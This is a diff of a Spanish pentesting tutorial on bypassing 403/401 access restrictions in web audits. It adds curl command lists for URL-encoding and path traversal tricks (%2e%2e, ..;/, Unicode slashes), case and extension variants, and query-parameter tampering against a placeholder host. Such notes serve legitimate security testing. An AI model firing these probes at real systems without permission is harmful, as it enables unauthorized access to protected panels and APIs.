@@ -1,10 +1,3 @@
----
-layout: default
-title: "Bypassing 401: Manipulación de cabeceras"
-permalink: /bypassing-401.html
----
-
-{% include back_button.html %}
 ## Introducción 
 
 Encontrarse con códigos 403 Forbidden es común dentro de aplicaciones web, normalmente detrás de ellos podemos encontrar paneles administrativos, APIs internas o endpoints sensibles. Aunque puedan parecer un callejón sin salida, debido a malas configuraciones en servidores, proxies o sistemas de acceso de control a veces pueden surgir grietas en las defensas por las que colarse. En estos apuntes voy a describir como funciona este código, por qué sucede y diferentes técnicas que pueden superarlo para acceder a recursos restringidos durante las auditorías web. 
@@ -114,3 +107,71 @@ curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" http://ejemplo.es/privado/
 
 Este truco hace que el servidor crea que la petición viene de un navegador normal y no de una herramienta automática. 
 
+## Path fuzzing & Encoding
+
+### Codificación de URL
+
+```bash
+curl -g --path-as-is "https://ejemplo.es/%2e%2e/admin"        # ../admin
+curl -g --path-as-is "https://ejemplo.es/%2e%2e%2fadmin"     # ../admin
+curl -g --path-as-is "https://ejemplo.es/%2e%2e%2f%61dmin"   # ../admin con la 'a' codificada
+curl -g --path-as-is "https://ejemplo.es/%2e%2e/%2e%2e/admin" # ../../admin
+curl -g --path-as-is "https://ejemplo.es/%2e%2e/%2fadmin"    # ..//admin
+curl -g --path-as-is "https://ejemplo.es/%20/admin"          # espacio/admin
+curl -g --path-as-is "https://ejemplo.es/%2e%2fadmin"        # ./admin
+curl -g --path-as-is "https://ejemplo.es/admin%2f"           # admin/
+curl -g --path-as-is "https://ejemplo.es/admin%252f"         # admin%2f (doble codificación)
+curl -g --path-as-is "https://ejemplo.es/admin%2e%2e%2f"     # admin../
+```
+
+| Truco                        | Ejemplo                           | Objetivo                                          |
+| ---------------------------- | --------------------------------- | ------------------------------------------------- |
+| Añadir barra final           | `/admin/`                         | Bypass de filtros que esperan `/admin` exacto     |
+| Insertar `..;/`              | `/..;/admin`                      | Confundir la normalización de rutas               |
+| Dobles barras                | `//admin//`                       | Evasión de reglas de normalización                |
+| Punto al final               | `/admin.`                         | Engañar expresiones regulares o filtros simples   |
+| Codificar la barra           | `/admin%2f`                       | Evadir filtros de ruta con encoding               |
+| Añadir extensión aleatoria   | `/admin.php`, `/admin.json`       | Algunos servidores ignoran rutas con extensiones  |
+| Barras invertidas o mixtas   | `\admin`, `/admin\/`              | Romper o confundir parsers de ruta                |
+| Punto y coma o espacio final | `/admin;`, `/admin%20`            | Confundir parsers o coincidencias demasiado laxas |
+| Secuencias Unicode           | `/admin%c0%af`, `/admin%ef%bc%8f` | Bypass con slash Unicode                          |
+| Parámetro o fragmento extra  | `/admin?foo=bar#`                 | Bypass de validación solo por path                |
+### Manipulación de mayúsculas
+```bash
+curl https://ejemplo.es/admin
+curl https://ejemplo.es/Admin
+curl https://ejemplo.es/ADMIN
+curl https://ejemplo.es/aDmiN
+curl https://ejemplo.es/adMin
+curl https://ejemplo.es/AdMiN
+curl https://ejemplo.es/aDMIN
+curl https://ejemplo.es/ADMIn
+```
+### Añadir sufijos
+```bash
+curl https://ejemplo.es/admin.json
+curl https://ejemplo.es/admin.css
+curl https://ejemplo.es/admin.js
+curl https://ejemplo.es/admin.html
+curl https://ejemplo.es/admin.php
+curl https://ejemplo.es/admin.aspx
+curl https://ejemplo.es/admin.xml
+curl https://ejemplo.es/admin.txt
+curl https://ejemplo.es/admin.bak
+curl https://ejemplo.es/admin.old
+curl https://ejemplo.es/admin.zip
+curl https://ejemplo.es/admin.tar.gz
+```
+
+Estos trucos pueden funcionar cuando el servidor restringe la ruta /admin pero la configuración no está preparada para contemplar otras variantes.
+
+## Modificación de parámetros
+
+
+````
+curl "https://ejemplo.es/admin?unused_param=1"
+curl "https://ejemplo.es/admin?redirect=allowed"
+curl "https://ejemplo.es/admin?debug=true"
+curl "https://ejemplo.es/admin?access=granted"
+curl "https://ejemplo.es/admin?token=123"
+`````
